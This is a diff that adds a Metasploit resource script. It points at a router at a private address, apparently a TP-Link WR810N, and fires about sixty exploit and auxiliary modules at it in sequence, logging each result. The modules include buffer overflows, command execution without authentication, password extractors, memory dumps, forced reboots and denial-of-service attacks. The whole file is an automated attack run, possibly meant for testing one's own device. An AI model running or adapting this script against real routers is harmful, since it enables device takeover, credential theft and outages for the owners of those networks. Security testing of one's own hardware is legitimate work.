@@ -1,0 +1,366 @@
+setg RHOST 192.168.0.254
+setg RHOSTS 192.168.0.254
+
+spool exploits-WR810N.0.log
+use exploits/linux/http/airties_login_cgi_bof
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.1.log
+use exploits/linux/http/belkin_login_bof
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.2.log
+use exploits/linux/http/ddwrt_cgibin_exec
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.3.log
+use exploits/linux/http/dlink_authentication_cgi_bof
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.4.log
+use exploits/linux/http/dlink_command_php_exec_noauth
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.5.log
+use exploits/linux/http/dlink_diagnostic_exec_noauth
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.6.log
+use exploits/linux/http/dlink_dir300_exec_telnet
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.7.log
+use exploits/linux/http/dlink_dir605l_captcha_bof
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.8.log
+use exploits/linux/http/dlink_dir615_up_exec
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.9.log
+use exploits/linux/http/dlink_dspw110_cookie_noauth_exec
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.10.log
+use exploits/linux/http/dlink_dspw215_info_cgi_bof
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.11.log
+use exploits/linux/http/dlink_hedwig_cgi_bof
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.12.log
+use exploits/linux/http/dlink_hnap_bof
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.13.log
+use exploits/linux/http/dlink_hnap_header_exec_noauth
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.14.log
+use exploits/linux/http/dlink_upnp_exec_noauth
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.16.log
+use exploits/linux/http/fritzbox_echo_exec
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.17.log
+use exploits/linux/http/linksys_apply_cgi
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.19.log
+use exploits/linux/http/linksys_themoon_exec
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.23.log
+use exploits/linux/http/multi_ncc_ping_exec
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.24.log
+use exploits/linux/http/netgear_dgn1000b_setup_exec
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.26.log
+use exploits/linux/http/netgear_readynas_exec
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.27.log
+use exploits/linux/http/realtek_miniigd_upnp_exec_noauth
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.28.log
+use exploits/linux/http/seagate_nas_php_exec_noauth
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.29.log
+use exploits/linux/misc/sercomm_exec
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.30.log
+use exploits/linux/upnp/dlink_upnp_msearch_exec
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.31.log
+use exploits/linux/upnp/miniupnpd_soap_bof
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.32.log
+use exploits/multi/http/cisco_dcnm_upload
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.33.log
+use exploits/multi/upnp/libupnp_ssdp_overflow
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.36.log
+use auxiliary/admin/cisco/vpn_3000_ftp_bypass
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.37.log
+use auxiliary/admin/http/arris_motorola_surfboard_backdoor_xss
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.38.log
+use auxiliary/admin/http/dlink_dir_300_600_exec_noauth
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.39.log
+use auxiliary/admin/http/dlink_dir_645_password_extractor
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.40.log
+use auxiliary/admin/http/dlink_dsl320b_password_extractor
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.41.log
+use auxiliary/admin/http/intersil_pass_reset
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.43.log
+use exploits/router/linksys_tmunblock_admin_reset_bof
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.45.log
+use auxiliary/admin/http/netgear_soap_password_extractor
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.46.log
+use auxiliary/admin/http/zyxel_admin_password_extractor
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.47.log
+use auxiliary/admin/misc/sercomm_dump_config
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.48.log
+use auxiliary/admin/motorola/wr850g_cred
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.49.log
+use auxiliary/admin/vxworks/apple_airport_extreme_password
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.50.log
+use auxiliary/admin/vxworks/dlink_i2eye_autoanswer
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.51.log
+use auxiliary/admin/vxworks/wdbrpc_memory_dump
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.52.log
+use auxiliary/admin/vxworks/wdbrpc_reboot
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.53.log
+use auxiliary/dos/cisco/ios_http_percentpercent
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.54.log
+use auxiliary/dos/dhcp/isc_dhcpd_clientid
+set RIP 192.168.0.254
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.56.log
+use auxiliary/dos/upnp/miniupnpd_dos
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.57.log
+use auxiliary/scanner/http/cisco_ios_auth_bypass
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.58.log
+use auxiliary/scanner/http/cisco_nac_manager_traversal
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.59.log
+use auxiliary/scanner/http/dlink_user_agent_backdoor
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.60.log
+use auxiliary/scanner/http/linksys_e1500_traversal
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.61.log
+use auxiliary/scanner/http/goahead_traversal
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.62.log
+use auxiliary/scanner/http/litespeed_source_disclosure
+set PATH_SAVE /tmp/
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.63.log
+use auxiliary/scanner/http/netgear_sph200d_traversal
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.64.log
+use auxiliary/scanner/ssl/openssl_ccs
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.65.log
+use auxiliary/scanner/ssl/openssl_heartbleed
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.66.log
+use auxiliary/scanner/http/allegro_rompager_misfortune_cookie
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.67.log
+use auxiliary/dos/dns/bind_tkey
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.68.log
+use exploits/linux/http/synology_dsm_sliceupload_exec_noauth
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.69.log
+use auxiliary/scanner/snmp/sbg6580_enum
+exploit -z
+spool off
+sessions -K
+
+spool exploits-WR810N.70.log
+use auxiliary/scanner/snmp/arris_dg950
+exploit -z
+spool off
+sessions -K
+
+quit
